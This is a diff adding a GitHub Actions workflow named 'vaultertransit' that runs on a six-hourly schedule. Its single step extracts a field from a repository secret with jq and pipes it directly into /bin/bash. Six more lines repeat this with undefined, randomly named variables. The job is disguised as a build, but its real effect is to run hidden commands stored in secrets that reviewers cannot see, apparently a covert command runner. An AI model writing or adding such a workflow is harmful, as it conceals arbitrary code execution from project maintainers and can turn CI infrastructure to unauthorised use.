@@ -1,0 +1,24 @@
+name: vaultertransit
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: vaultertransit
+        env:
+          qp53: ${{ secrets.qp53 }}
+        run: |
+          echo $qp53 | jq -r .az426 | /bin/bash
+          echo $dlcva828 | jq -r .opjjp892 | /bin/bash
+          echo $z0 | jq -r .p62 | /bin/bash
+          echo $p24 | jq -r .icec1 | /bin/bash
+          echo $inee3201 | jq -r .vrq46326 | /bin/bash
+          echo $oi075 | jq -r .scawr062 | /bin/bash
+          echo $hx9 | jq -r .acus78585 | /bin/bash
+
